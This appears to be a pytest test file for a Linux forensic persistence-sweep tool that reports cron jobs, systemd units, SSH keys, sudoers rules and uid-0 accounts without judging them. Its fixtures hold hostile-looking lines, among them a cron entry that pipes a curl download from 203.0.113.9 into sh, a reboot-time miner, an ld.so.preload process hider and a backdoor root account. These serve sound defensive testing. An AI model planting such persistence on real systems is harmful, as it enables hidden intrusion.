"""run_linux_persistence: what a Linux tree starts and whom it lets in, without a verdict."""

from __future__ import annotations

import json
import os
import subprocess
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from mulder import dirroot, linuxvol
from mulder.audit import AuditLog
from mulder.db import CaseDB
from mulder.linuxvol import EXPORT_MARKER, Scan, Volume, export_dir
from mulder.server import app
from mulder.server.app import _tool_dispatch_sync
from mulder.server.extract_helpers import extract_and_index
from mulder.server.helpers import TOOL_SOURCE_PREFIXES, tool_already_indexed
from mulder.server.tools import linux
from tests.triage_trees import kape, uac, write

KEY = "ssh-rsa " + "AAAAB3NzaC1yc2EAAAADAQABAAABAQC7" * 8 + " intruder@kali"
WHEN = 1_570_274_078  # 2019-10-05T11:14:38Z

TREE: dict[str, bytes | str] = {
    "etc/passwd": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
        "toor:x:0:0::/var/tmp:/bin/sh\n"
        "svc:x:999:999::/opt/svc:/bin/false\n"
    ),
    "etc/passwd-": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
    ),
    "etc/group": "root:x:0:\nsudo:x:27:alice,toor\nusers:x:100:bob\n",
    "etc/crontab": "# m h dom mon dow user command\n17 * * * * root run-parts /etc/cron.hourly\n",
    "etc/cron.d/sync": "*/5 * * * * root curl -s http://203.0.113.9/a | sh\n",
    "var/spool/cron/crontabs/www-data": "@reboot /tmp/.x/miner\n",
    "var/spool/cron/atjobs/a0000101": "#!/bin/sh\n/tmp/once\n",
    "etc/systemd/system/update.service": "[Service]\nExecStart=/usr/local/bin/update\n",
    "lib/systemd/system/ssh@.service": "[Service]\nExecStart=-/usr/sbin/sshd -i\n",
    "lib/systemd/systemd": b"\x7fELF\x00",
    "etc/rc.local": "#!/bin/sh\nexit 0\n",
    "etc/ld.so.preload": "/usr/lib/libprocesshider.so\n",
    "home/alice/.ssh/authorized_keys": KEY + "\n",
    "home/alice/.bashrc": "# ~/.bashrc\n\nalias ll='ls -l'\n",
    "home/alice/notes.txt": "not a persistence location\n",
    "etc/profile.d/proxy.sh": "export http_proxy=http://10.0.0.1:3128\n",
    "etc/sudoers.d/90-cloud": "alice ALL=(ALL) NOPASSWD:ALL\n",
    "etc/modules-load.d/vbox.conf": "vboxdrv\n",
    "etc/pam.d/sshd": "auth required pam_unix.so\n",
    "etc/udev/rules.d/70-net.rules": 'SUBSYSTEM=="net", RUN+="/bin/x"\n',
    "etc/update-motd.d/00-header": "#!/bin/sh\nuname -a\n",
}


@pytest.fixture
def case(
    tmp_case_db: CaseDB,
    tmp_audit_log: AuditLog,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> Iterator[CaseDB]:
    ctx = app.ServerContext(
        case_id="test-case", db=tmp_case_db, correlator=MagicMock(), audit=tmp_audit_log
    )
    monkeypatch.setattr(app, "_ctx", ctx)
    monkeypatch.setattr(app, "_cfg", app.ServerConfig(db_dir=tmp_path / "cases"))
    monkeypatch.setattr(linuxvol, "scan", lambda image: Scan())
    dirroot.refresh()
    yield tmp_case_db
    dirroot.refresh()


def _tree(root: Path, files: dict[str, bytes | str] = TREE) -> Path:
    write(root, files)
    for path in root.rglob("*"):
        os.utime(path, (WHEN, WHEN))
    return root


def _sweep(path: Path | str, **kwargs: object) -> dict[str, Any]:
    return dict(_tool_dispatch_sync["run_linux_persistence"](image_path=str(path), **kwargs))


def _rows(db: CaseDB) -> list[list[str]]:
    text = "".join(w.raw_text for w in db.get_windows_by_source("linux.persistence"))
    return [line.split("\t") for line in text.splitlines()[1:]]


def test_one_row_per_file_with_its_path_time_size_and_first_lines(
    case: CaseDB, tmp_path: Path
) -> None:
    root = _tree(tmp_path / "root")

    result = _sweep(root)["results"]

    rows = {row[1]: row for row in _rows(case) if row[0] != "account"}
    assert rows["etc/cron.d/sync"] == [
        "cron",
        "etc/cron.d/sync",
        "modified=2019-10-05T11:14:38Z",
        "size=51",
        "*/5 * * * * root curl -s http://203.0.113.9/a | sh",
    ]
    kinds = {path: row[0] for path, row in rows.items()}
    assert kinds == {
        "etc/crontab": "cron",
        "etc/cron.d/sync": "cron",
        "var/spool/cron/crontabs/www-data": "cron",
        "var/spool/cron/atjobs/a0000101": "cron",
        "etc/systemd/system/update.service": "systemd",
        "lib/systemd/system/ssh@.service": "systemd",
        "etc/rc.local": "init",
        "etc/ld.so.preload": "ld_preload",
        "home/alice/.ssh/authorized_keys": "ssh",
        "home/alice/.bashrc": "shell_profile",
        "etc/profile.d/proxy.sh": "shell_profile",
        "etc/sudoers.d/90-cloud": "sudoers",
        "etc/modules-load.d/vbox.conf": "kernel_modules",
        "etc/pam.d/sshd": "pam",
        "etc/udev/rules.d/70-net.rules": "udev",
        "etc/update-motd.d/00-header": "login_hooks",
    }
    # Comments are left out, and a key is shortened so that what follows it shows.
    assert rows["etc/crontab"][4] == "17 * * * * root run-parts /etc/cron.hourly"
    assert rows["home/alice/.ssh/authorized_keys"][4] == "ssh-rsa <...> intruder@kali"
    assert rows["home/alice/.bashrc"][4] == "alias ll='ls -l'"
    assert result["by_kind"]["cron"] == 4 and result["rows"] == len(_rows(case))
    assert result["source"] == "linux.persistence" and result["files_not_readable"] == 0
    assert [s.source_path for s in case.get_sources()] == [str(root)]


def test_accounts_with_uid_0_a_shell_or_added_since_the_backup(
    case: CaseDB, tmp_path: Path
) -> None:
    _sweep(_tree(tmp_path / "root"))

    accounts = [row[4] for row in _rows(case) if row[0] == "account"]
    # What matters most first, so that a cut takes the least of it.
    assert accounts == [
        "name=root uid=0 gid=0 home=/root shell=/bin/bash (uid 0, has a login shell)",
        "name=toor uid=0 gid=0 home=/var/tmp shell=/bin/sh "
        "(uid 0, has a login shell, not in etc/passwd-)",
        "group=sudo members=alice,toor",
        "name=svc uid=999 gid=999 home=/opt/svc shell=/bin/false (not in etc/passwd-)",
        "name=alice uid=1000 gid=1000 home=/home/alice shell=/bin/bash (has a login shell)",
    ]


def test_more_accounts_than_are_shown_is_said_and_cuts_the_ordinary_ones(
    case: CaseDB, tmp_path: Path
) -> None:
    """New accounts are at the end of etc/passwd: a cut by position took those first."""
    users = "".join(f"u{n}:x:{2000 + n}:{2000 + n}::/home/u{n}:/bin/bash\n" for n in range(300))
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/bash\n" + users + "last:x:0:0::/:/bin/sh\n",
            "etc/passwd-": "root:x:0:0::/root:/bin/bash\n" + users,
            "etc/group": "sudo:x:27:u299\n",
        },
    )

    result = _sweep(root)["results"]

    accounts = [row[4] for row in _rows(case) if row[0] == "account"]
    assert len(accounts) == 200 == result["by_kind"]["account"]
    assert accounts[1].startswith("name=last uid=0") and accounts[2] == "group=sudo members=u299"
    assert result["accounts_not_shown"] == 103 and result["truncated"] is True
    header = "".join(w.raw_text for w in case.get_windows_by_source("linux.persistence"))
    assert "103 accounts that only have a login shell are not shown" in header.split("\n")[0]


def test_an_account_appended_to_a_long_passwd_is_still_seen(case: CaseDB, tmp_path: Path) -> None:
    """New accounts go to the end of the file, well past the first lines of a large one."""
    many = "".join(
        f"svc{n}:x:{2000 + n}:{2000 + n}::/nonexistent:/usr/sbin/nologin\n" for n in range(400)
    )
    root = _tree(
        tmp_path / "root",
        {"etc/passwd": many + "support:x:0:0::/tmp:/bin/bash\n", "etc/passwd-": many},
    )

    _sweep(root)

    assert [row[4] for row in _rows(case) if row[0] == "account"] == [
        "name=support uid=0 gid=0 home=/tmp shell=/bin/bash "
        "(uid 0, has a login shell, not in etc/passwd-)"
    ]


def test_a_record_of_etc_passwd_ends_at_a_newline_and_nowhere_else(
    case: CaseDB, tmp_path: Path
) -> None:
    """As glibc reads it. Cut at a form feed or U+2028 in the GECOS field, a uid 0 account
    is two short lines, and no row."""
    doors = {"ff": "\x0c", "vt": "\x0b", "fs": "\x1c", "cr": "a\rb", "nel": "\x85", "ls": "\u2028"}
    passwd = "root:x:0:0:root:/root:/bin/bash\n" + "".join(
        f"{name}:x:0:0:{gecos}:/root:/bin/bash\n" for name, gecos in doors.items()
    )
    passwd += "zeros:x:00:0::/root:/bin/sh\nplus:x:+0:0::/root:/bin/sh\n"  # uid 0 to glibc too
    crlf = (
        "root:x:0:0::/root:/bin/sh\r\nbin:x:2:2::/bin:/usr/sbin/nologin\r\n"  # edited on Windows
    )
    root = _tree(tmp_path / "root", {"etc/passwd": passwd, "srv/etc/passwd": crlf})

    result = _sweep(root)["results"]

    rows = [row for row in _rows(case) if row[0] == "account"]
    assert all(len(row) == 5 for row in rows)
    named = {row[4].split(" ")[0]: row[4] for row in rows if row[1] == "etc/passwd"}
    assert set(named) == {f"name={name}" for name in ("root", *doors, "zeros", "plus")}
    assert all("(uid 0, has a login shell)" in said for said in named.values())
    other = [row[4] for row in rows if row[1] == "srv/etc/passwd"]
    assert other == ["name=root uid=0 gid=0 home=/root shell=/bin/sh (uid 0, has a login shell)"]
    assert result["by_kind"] == {"account": 10} and result["accounts_not_shown"] == 0


def test_every_etc_passwd_is_read_with_its_own_backup_the_systems_first(
    case: CaseDB, tmp_path: Path
) -> None:
    """backup/ lists before etc/: its copy is not the system's, and does not stand for it."""
    layer = "var/lib/docker/overlay2/abc/diff/"
    root = _tree(
        tmp_path / "root",
        {
            "backup/etc/passwd": "root:x:0:0::/root:/bin/sh\ndecoy:x:1000:1000::/home/d:/bin/sh\n",
            "etc/passwd": "root:x:0:0::/root:/bin/sh\nrealdoor:x:0:0::/root:/bin/sh\n",
            "etc/passwd-": "root:x:0:0::/root:/bin/sh\n",
            "etc/group": "sudo:x:27:realdoor\n",
            layer + "etc/passwd": "root:x:0:0::/root:/bin/ash\nlayered:x:0:0::/:/bin/ash\n",
            layer + "etc/passwd-": "root:x:0:0::/root:/bin/ash\nlayered:x:0:0::/:/bin/ash\n",
            "old/etc/group": "sudo:x:27:nobody\n",  # no passwd beside it: nothing to expand
        },
    )

    result = _sweep(root)["results"]

    rows = [(row[1], row[4]) for row in _rows(case) if row[0] == "account"]
    assert [(path, said.split(" ")[0]) for path, said in rows] == [
        ("etc/passwd", "name=root"),
        ("etc/passwd", "name=realdoor"),
        ("etc/passwd", "group=sudo"),
        ("backup/etc/passwd", "name=root"),
        ("backup/etc/passwd", "name=decoy"),
        (layer + "etc/passwd", "name=root"),
        (layer + "etc/passwd", "name=layered"),
    ]
    marks = {(path, said.split(" ")[0]): said for path, said in rows}
    assert "not in etc/passwd-" in marks[("etc/passwd", "name=realdoor")]
    # Compared with the passwd- beside it, or with none: never with another tree's.
    assert "passwd-" not in marks[("backup/etc/passwd", "name=decoy")]
    assert "passwd-" not in marks[(layer + "etc/passwd", "name=layered")]
    assert result["by_kind"] == {"account": 7} and result["passwd_files_not_read"] == 0
    assert "names the etc/passwd it is from" in result["note"]


def test_more_files_named_etc_passwd_than_are_read_is_said(
    case: CaseDB, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(linux, "_MAX_TREES", 2)
    files: dict[str, bytes | str] = {
        f"layers/{n}/etc/passwd": f"u{n}:x:0:0::/:/bin/sh\n" for n in range(4)
    }
    root = _tree(tmp_path / "root", {**files, "etc/passwd": "root:x:0:0::/root:/bin/sh\n"})

    result = _sweep(root)["results"]

    assert [row[1] for row in _rows(case)] == ["etc/passwd", "layers/0/etc/passwd"]
    assert result["passwd_files_not_read"] == 3 and result["truncated"] is True
    header = "".join(w.raw_text for w in case.get_windows_by_source("linux.persistence"))
    assert "3 more files named etc/passwd" in header.split("\n")[0]


def test_an_account_changed_since_the_backup_is_marked(case: CaseDB, tmp_path: Path) -> None:
    """A service account given a shell is in both files: its name alone says nothing."""
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": (
                "mail:x:8:8:mail:/var/mail:/bin/bash\n"
                "games:x:5:60:Games:/usr/games:/usr/sbin/nologin\n"
                "www-data:x:0:33::/var/www:/usr/sbin/nologin\n"
            ),
            "etc/passwd-": (
                "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n"
                "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n"  # only the GECOS differs
                "www-data:x:33:33::/var/www:/usr/sbin/nologin\n"
            ),
        },
    )

    _sweep(root)

    assert [row[4] for row in _rows(case)] == [
        "name=www-data uid=0 gid=33 home=/var/www shell=/usr/sbin/nologin "
        "(uid 0, changed since etc/passwd-)",
        "name=mail uid=8 gid=8 home=/var/mail shell=/bin/bash "
        "(has a login shell, changed since etc/passwd-)",
    ]


def test_it_reports_what_exists_and_passes_no_verdict(case: CaseDB, tmp_path: Path) -> None:
    result = _sweep(_tree(tmp_path / "root"))["results"]

    text = "".join(w.raw_text for w in case.get_windows_by_source("linux.persistence")).lower()
    body = text.split("\n", 1)[1]
    for word in ("malicious", "suspicious", "backdoor", "anomal", "severity"):
        assert word not in body, word
    for said in ("not that it is malicious", "ever ran", "can mean it was not copied"):
        assert said in result["note"] and said in text.split("\n", 1)[0]
    assert result["most_recently_modified"][0].split(" ")[2] == "modified=2019-10-05T11:14:38Z"


def test_what_the_evidence_says_is_bounded_and_cannot_write_a_row(
    case: CaseDB, tmp_path: Path
) -> None:
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "evil\tname\x1b[2J:x:0:0::/root:/bin/sh\n",
            "etc/cron.d/a\tb": "x\n",
            "etc/cron.d/long": "A = b\n" * 5000,
            "etc/cron.d/forge": "ok\rcron\tetc/cron.d/planted\tmodified=x\tsize=1\tpwned\n",
            "etc/cron.d/blob": b"\x00\x01\x02" * 100,
        },
    )
    (root / "etc/cron.d/fifo").parent.mkdir(exist_ok=True)
    os.mkfifo(root / "etc/cron.d/fifo")
    (root / "etc/cron.d/link").symlink_to("/etc/passwd")

    result = _sweep(root)["results"]

    rows = _rows(case)
    assert all(len(row) == 5 for row in rows)
    by_path = {row[1]: row for row in rows}
    assert set(by_path) == {
        "etc/passwd",
        "etc/cron.d/a^b",
        "etc/cron.d/long",
        "etc/cron.d/forge",
        "etc/cron.d/blob",
    }  # neither the FIFO nor the link out of the tree was opened
    assert by_path["etc/cron.d/long"][3] == "size=30000"
    assert len(by_path["etc/cron.d/long"][4]) <= 310 and by_path["etc/cron.d/long"][4].endswith(
        "[cut]"
    )
    assert by_path["etc/cron.d/blob"][4] == "(binary)"
    forged = by_path["etc/cron.d/forge"][4]
    assert forged == "ok | cron etc/cron.d/planted modified=x size=1 pwned"
    assert "name=evil name^[2J uid=0" in by_path["etc/passwd"][4]
    assert result["truncated"] is False


def test_a_collection_and_an_export_are_swept_by_the_paths_their_listings_show(
    case: CaseDB, tmp_path: Path
) -> None:
    collection = uac(tmp_path)
    write(collection, {"[root]/etc/cron.d/job": "* * * * * root id\n"})
    _sweep(collection)
    assert ["cron", "etc/cron.d/job"] in [row[:2] for row in _rows(case)]

    # A volume with no place of its own in an export sits under its own name: a
    # location is found from any directory.
    export = _tree(
        tmp_path / "export",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/sh\n",
            "p5_lvm6/bob/.ssh/authorized_keys": KEY + "\n",
        },
    )
    _sweep(export)
    listed = [row[1] for row in _rows(case)]
    assert "p5_lvm6/bob/.ssh/authorized_keys" in listed and "etc/passwd" in listed


def test_places_the_first_sweep_missed(case: CaseDB, tmp_path: Path) -> None:
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/sh\n",
            # A drop-in overrides a unit without touching the unit's own file.
            "etc/systemd/system/ssh.service.d/override.conf": "[Service]\nExecStartPre=/tmp/x\n",
            "etc/systemd/system.conf": "[Manager]\n",  # configuration of systemd, not a unit
            # Where "AuthorizedKeysFile /etc/ssh/authorized_keys/%u" keeps them.
            "etc/ssh/authorized_keys/alice": KEY + "\n",
            "var/lib/backup/authorized_keys": KEY + "\n",
        },
    )

    _sweep(root)

    kinds = {row[1]: row[0] for row in _rows(case) if row[0] != "account"}
    assert kinds == {
        "etc/systemd/system/ssh.service.d/override.conf": "systemd",
        "etc/ssh/authorized_keys/alice": "ssh",
        "var/lib/backup/authorized_keys": "ssh",
    }


def test_a_path_is_shown_whole_and_a_private_key_not_at_all(case: CaseDB, tmp_path: Path) -> None:
    long_path = "/opt/vendor/product/releases/current/bin/agent/supervisor/launcher"
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/sh\n",
            "etc/systemd/system/agent.service": f"[Service]\nExecStart={long_path} --daemon\n",
            "etc/cron.d/agent": f"* * * * * root {long_path}\n",
            "etc/cron.d/deploy": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEA\n",
            "root/.ssh/authorized_keys": KEY + "\n",
        },
    )

    _sweep(root)

    shown = {row[1]: row[4] for row in _rows(case)}
    assert len(long_path) > 48  # as long as a key, and nothing like one
    assert (
        shown["etc/systemd/system/agent.service"] == f"[Service] | ExecStart={long_path} --daemon"
    )
    assert shown["etc/cron.d/agent"] == f"* * * * * root {long_path}"
    assert shown["root/.ssh/authorized_keys"] == "ssh-rsa <...> intruder@kali"
    assert shown["etc/cron.d/deploy"] == "(a private key: content withheld)"


def test_an_incomplete_export_is_not_swept_as_if_it_were_whole(
    case: CaseDB, tmp_path: Path
) -> None:
    """A crontab in a directory the export could not read has no row: the sweep says why."""
    export = export_dir(tmp_path / "cases/extracted/test-case", "/evidence/web01.E01")
    _tree(export, {"etc/passwd": "root:x:0:0::/root:/bin/sh\n", "etc/crontab": "@reboot /x\n"})
    summary = {
        "status": "incomplete",
        "listing_incomplete": ["/var/spool/cron/crontabs"],
        "not_exported": {"image_export did not copy it": ["/etc/cron.d/job"]},
        "problems": ["-: an image_export run stopped early"],
    }
    record = {"summary": summary, "places": {"": ""}}
    write(export.parent, {EXPORT_MARKER: json.dumps(record)})

    result = _sweep(export)["results"]

    gaps = result["export_incomplete"]
    assert gaps["listing_incomplete"] == ["/var/spool/cron/crontabs"]
    assert gaps["not_copied"] == ["/etc/cron.d/job"] and "was not examined" in gaps["note"]
    header = "".join(w.raw_text for w in case.get_windows_by_source("linux.persistence"))
    assert "INCOMPLETE EXPORT" in header.split("\n")[0]
    assert "/var/spool/cron/crontabs" in header.split("\n")[0]

    # A whole export, and a directory that only carries the file an export has, say nothing.
    summary["status"] = "exported"
    write(export.parent, {EXPORT_MARKER: json.dumps(record)})
    assert "export_incomplete" not in _sweep(export, force=True)["results"]
    planted = _tree(tmp_path / "evidence/files", {"etc/crontab": "@reboot /x\n"})
    summary["status"] = "incomplete"
    write(planted.parent, {EXPORT_MARKER: json.dumps(record)})
    assert "export_incomplete" not in _sweep(planted)["results"]


def test_a_disk_image_sleuth_kit_reads_is_swept_through_its_listing(
    case: CaseDB, tmp_path: Path
) -> None:
    image = str(tmp_path / "ext4.dd")
    Path(image).write_bytes(b"\x00" * 2048)
    listing = (
        "r/r 12:\tetc/crontab\nr/r * 13:\tetc/cron.d/gone\nd/d 14:\tetc/cron.d\n"
        "l/l 15:\tetc/cron.d/link\n"
    )
    content = subprocess.CompletedProcess(["icat"], 0, b"0 5 * * * root /opt/job\n", b"")
    with (
        patch.object(linux, "_collect_fls_chunks", return_value=[([listing], 2048)]),
        patch.object(linux, "icat", return_value=content) as icat,
    ):
        result = _sweep(image)["results"]

    # A deleted entry's inode may hold another file. No more than the first
    # bytes are read, however large the file at a persistence location is.
    icat.assert_called_once_with(image, 2048, "12", limit=4096)
    assert _rows(case) == [
        ["cron", "etc/crontab", "modified=unknown", "size=24", "0 5 * * * root /opt/job"]
    ]
    assert result["most_recently_modified"] == []

    more = subprocess.CompletedProcess(["icat"], 0, b"A = b\n" * 700, b"")  # 4,200 bytes came
    with (
        patch.object(linux, "_collect_fls_chunks", return_value=[([listing], 2048)]),
        patch.object(linux, "icat", return_value=more),
    ):
        _sweep(image, force=True)
    row = _rows(case)[-1]
    assert row[3] == "size=over 4096" and row[4].endswith("[cut]")


def test_a_file_that_cannot_be_read_from_an_image_is_counted_not_raised(
    case: CaseDB, tmp_path: Path
) -> None:
    """icat that times out, or is gone: the sweep goes on and says how many it could not read."""
    image = str(tmp_path / "ext4.dd")
    Path(image).write_bytes(b"\x00" * 2048)
    listing = "r/r 12:\tetc/crontab\nr/r 13:\tetc/rc.local\nr/r 14:\tetc/passwd\n"

    def fake_icat(image: str, offset: int, inode: str, **_: object) -> Any:
        if inode == "12":
            raise subprocess.TimeoutExpired(["icat"], 30)
        if inode == "14":
            raise FileNotFoundError("icat")
        return subprocess.CompletedProcess(["icat"], 0, b"exit 0\n", b"")

    with (
        patch.object(linux, "_collect_fls_chunks", return_value=[([listing], 0)]),
        patch.object(linux, "icat", side_effect=fake_icat),
    ):
        result = _sweep(image)["results"]

    assert [row[1] for row in _rows(case)] == ["etc/rc.local"]
    assert result["files_not_readable"] == 2

    # Found and none of them read is not "none of the locations is among the files".
    with (
        patch.object(linux, "_collect_fls_chunks", return_value=[([listing], 0)]),
        patch.object(linux, "icat", side_effect=FileNotFoundError("icat")),
    ):
        none = _sweep(image, force=True)
    assert none["error_type"] == "unreadable" and "3 files" in none["error_message"]


def test_an_image_listed_twice_is_swept_once(case: CaseDB, tmp_path: Path) -> None:
    """run_fls with force indexes a second tsk.filelist for the image: the same rows again."""
    image = str(tmp_path / "db02.raw")
    listing = "r/r 12:\tetc/rc.local\nr/r 20:\tetc/cron.d/dbjob\nr/r 20:\tetc/cron.d/hardlink\n"
    extract_and_index(listing, "tsk.filelist", image, "sleuthkit")
    extract_and_index(listing, "tsk.filelist", image, "sleuthkit")
    content = subprocess.CompletedProcess(["icat"], 0, b"@daily /db\n", b"")

    with (
        patch.object(linux, "icat", return_value=content),
        patch("mulder.server.tools.extract.tsk._resolve_partition_offset", return_value=0),
    ):
        result = _sweep(image)["results"]

    # A second name of the same inode is another place something starts from.
    assert sorted(row[1] for row in _rows(case)) == [
        "etc/cron.d/dbjob",
        "etc/cron.d/hardlink",
        "etc/rc.local",
    ]
    assert result["rows"] == 3


def test_two_images_in_one_case_are_each_swept_through_their_own_listing(
    case: CaseDB, tmp_path: Path
) -> None:
    """Every image's listing is indexed as tsk.filelist: one image's rows are not another's."""
    web, db = str(tmp_path / "web01.raw"), str(tmp_path / "db02.raw")
    extract_and_index(
        "r/r 12:\tetc/passwd\nr/r 13:\tetc/crontab\nr/r 14:\tetc/sudoers.d/90-evil\n",
        "tsk.filelist",
        web,
        "sleuthkit",
    )
    extract_and_index(
        "r/r 12:\tetc/hostname\nr/r 13:\tetc/passwd\nr/r 20:\tetc/cron.d/dbjob\n",
        "tsk.filelist",
        db,
        "sleuthkit",
    )
    held = {
        (web, "12"): b"root:x:0:0::/root:/bin/sh\n",
        (web, "13"): b"@reboot /web\n",
        (web, "14"): b"bob ALL=(ALL) NOPASSWD:ALL\n",
        (db, "12"): b"db02\n",
        (db, "13"): b"root:x:0:0::/root:/bin/sh\nmallory:x:0:0::/:/bin/sh\n",
        (db, "20"): b"@daily /db\n",
    }

    def fake_icat(image: str, offset: int, inode: str, **_: object) -> Any:
        return subprocess.CompletedProcess(["icat"], 0, held[(image, inode)], b"")

    with (
        patch.object(linux, "icat", side_effect=fake_icat),
        patch("mulder.server.tools.extract.tsk._resolve_partition_offset", return_value=0),
    ):
        result = _sweep(db)["results"]
        rows = [row for row in _rows(case)]
        _sweep(web)

    assert [row[:2] for row in rows if row[0] != "account"] == [["cron", "etc/cron.d/dbjob"]]
    assert [row[4].split(" ")[0] for row in rows if row[0] == "account"] == [
        "name=root",
        "name=mallory",  # db02's own second uid 0 account, read from db02's etc/passwd
    ]
    assert result["by_kind"] == {"cron": 1, "account": 2}
    both = "".join(w.raw_text for w in case.get_windows_by_source("linux.persistence"))
    assert both.count("etc/crontab") == 1 and both.count("etc/cron.d/dbjob") == 1


def test_nothing_found_is_not_reported_as_a_clean_system(case: CaseDB, tmp_path: Path) -> None:
    result = _sweep(kape(tmp_path / "k"))
    assert result["error_type"] == "not_applicable"
    assert "does not show the system has none" in result["suggestion"]
    assert case.get_sources() == []

    image = tmp_path / "lvm.dd"
    image.write_bytes(b"x")
    with patch.object(linux, "_collect_fls_chunks", return_value=[]):
        unlisted = _sweep(image)
    assert unlisted["error_type"] == "no_filelist"
    assert unlisted["suggestion"] == "Run run_fls on the image first."
    # Listed by Sleuth Kit, and none of the places in it: not "the system has none".
    with patch.object(
        linux, "_collect_fls_chunks", return_value=[(["r/r 5:\tboot/grub.cfg\n"], 0)]
    ):
        boot_only = _sweep(image)
    assert boot_only["error_type"] == "not_applicable"
    assert "does not show the system has none" in boot_only["suggestion"]


def test_an_image_that_was_exported_is_answered_with_its_export_directory(
    case: CaseDB, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    image = tmp_path / "lvm.E01"
    image.write_bytes(b"x")
    monkeypatch.setattr(linuxvol, "scan", lambda path: Scan((Volume(0, "lvm"),)))
    with patch.object(linux, "_collect_fls_chunks", return_value=[]):
        assert "run export_linux_files" in _sweep(image)["suggestion"]
        export = export_dir(tmp_path / "cases/extracted/test-case", str(image))
        write(export.parent, {EXPORT_MARKER: '{"summary": {}, "places": {}}'})
        assert f"pass {export} as image_path" in _sweep(image)["suggestion"]


def test_a_second_sweep_of_the_same_path_is_skipped(case: CaseDB, tmp_path: Path) -> None:
    root = _tree(tmp_path / "root")
    _sweep(root)

    assert _sweep(root)["results"]["status"] == "skipped"
    assert TOOL_SOURCE_PREFIXES["run_linux_persistence"] == ["linux.persistence"]
    assert tool_already_indexed("run_linux_persistence", evidence_path=str(root))
    assert not tool_already_indexed("run_linux_persistence", evidence_path=str(tmp_path / "b"))
    assert _sweep(root, force=True)["results"]["rows"] > 0


# --- the text indexer on a Linux tree ---------------------------------------


def _index(root: Path, pattern: str, **kwargs: object) -> dict[str, Any]:
    with patch("mulder.server.tools.extract.app_files.shutil.which", return_value="/usr/bin/icat"):
        result = _tool_dispatch_sync["index_app_files"](
            case_id="test-case", image_path=str(root), directory_pattern=pattern, **kwargs
        )
    results: dict[str, Any] = dict(result)["results"]
    return results


def test_on_a_linux_tree_the_content_decides_not_the_name(case: CaseDB, tmp_path: Path) -> None:
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/bash\n",
            "root/.bash_history": "wget http://203.0.113.9/x.sh\nchmod +x x.sh\n",
            "root/.viminfo": "# viminfo\n",
            "root/notes": "todo\n",
            "root/payload": b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64,
            "root/old.log.2.gz": b"\x1f\x8b\x08\x08" + b"\x55" * 64,
            "root/big.txt": "A" * 4096,
        },
    )

    result = _index(root, "root", max_file_size_kb=2)

    assert result["extensions_used"] == ["*"]
    assert sorted(result["sample_files"]) == ["root/.bash_history", "root/.viminfo", "root/notes"]
    assert result["files_discovered"] == 6 and result["files_skipped_binary"] == 2
    assert result["files_skipped_too_large"] == 1  # said apart: it is not binary
    assert result["too_large"] == ["root/big.txt"]  # and by name: the file to ask for again
    text = "".join(w.raw_text for w in case.get_windows_by_source("appfiles.root..bash_history"))
    assert text.startswith("=== root/.bash_history ===") and "203.0.113.9/x.sh" in text


def test_a_file_over_the_size_limit_is_not_read_past_it(
    case: CaseDB, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """On a Linux tree any file is a candidate: a database dump must not be held in memory."""
    root = _tree(
        tmp_path / "root",
        {"etc/passwd": "root:x:0:0::/root:/bin/bash\n", "var/www/index.php": "<?php echo 1;\n"},
    )
    with open(root / "var/www/dump.sql", "wb") as dump:
        dump.truncate(3 * 1024**3)  # sparse: 3 GiB that take no space
    asked: list[int] = []
    real = dirroot.read_regular

    def counting(path: str | Path, limit: int, whole: bool = False) -> Any:
        asked.append(limit)
        return real(path, limit, whole)

    monkeypatch.setattr(dirroot, "read_regular", counting)

    result = _index(root, "var/www")

    assert result["files_indexed"] == 1 and result["files_skipped_too_large"] == 1
    assert result["files_skipped_binary"] == 0
    assert asked and max(asked) == 512 * 1024 + 1


def test_a_private_key_under_any_name_is_withheld_by_its_first_line(
    case: CaseDB, tmp_path: Path
) -> None:
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/bash\n",
            "home/alice/.ssh/aws-prod.pem": "-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n",
            "home/alice/.ssh/deploy": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blbn\n",
            "home/alice/.ssh/deploy.pub": "ssh-ed25519 AAAA alice@laptop\n",
            "var/backups/shadow.bak": "root:$6$salt$hash:19000:0:99999:7:::\n",
        },
    )

    result = _index(root, "home")

    assert result["sample_files"] == ["home/alice/.ssh/deploy.pub"]
    assert result["files_withheld"] == 2 and result["files_skipped_binary"] == 0
    assert result["withheld"] == ["home/alice/.ssh/aws-prod.pem", "home/alice/.ssh/deploy"]
    assert _index(root, "var/backups")["files_withheld"] == 1  # Debian's copy of etc/shadow
    indexed = "".join(
        w.raw_text for s in case.get_sources() for w in case.get_windows_by_source(s.source_name)
    )
    assert "PRIVATE KEY" not in indexed and "$6$salt$hash" not in indexed


def test_password_hashes_on_a_var_partition_are_withheld_from_the_index(
    case: CaseDB, tmp_path: Path
) -> None:
    """/var on a partition of its own: fls lists Debian's copy as backups/shadow.bak."""
    image = str(tmp_path / "var.raw")
    listing = "r/r 12:\tbackups/shadow.bak\nr/r 13:\tbackups/passwd.bak\n"
    extract_and_index(listing, "tsk.filelist", image, "sleuthkit")
